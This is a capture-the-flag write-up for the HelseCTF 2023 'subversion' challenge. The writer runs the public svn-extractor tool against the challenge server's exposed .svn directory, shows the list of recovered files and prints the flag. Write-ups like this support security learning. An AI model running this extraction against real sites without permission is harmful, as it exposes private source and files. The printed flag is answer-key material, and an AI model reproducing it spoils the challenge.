# subversion (477)

Følgende fil ble funnet på en webserver, Kan det ligge et flagg her et sted?

https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/.svn/entries

# Writeup

Googled "svn extractor" and found [svn-extractor](https://github.com/anantshri/svn-extractor). Just had to read the script, verify it's not bad and run it on my virtual machine. And sure enough it found the files.

```
$ python3 svn_extractor.py --url https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/               
Proxy not defined
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/
Checking if URL is correct
URL is active
Checking for presence of wc.db
WC.db found
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file1.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file10.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file11.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file12.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file13.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file14.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file15.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file16.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file17.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file18.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file19.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file2.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file20.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file21.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file22.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file23.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file24.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file25.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file26.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file27.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file28.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file29.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file3.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file30.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file31.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file32.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file33.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file34.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file35.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file36.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file37.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file38.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file39.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file4.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file40.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file41.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file42.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file43.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file44.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file45.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file46.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file47.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file48.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file49.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file5.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file50.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file6.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file7.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file8.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/file9.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/thisfilehastheflag.txt
https://helsectf2023-6ac4e1c6d8855c1bd96a-subversion.chals.io/index.html
lets see if we can find .svn/entries
SVN Entries Found if no file listed check wc.db too
```

Opened the `thisfilehastheflag.txt` and there it was.

# Flag

```
helsectf{why_does_no_one_use_cvs_anymore?:'(}
```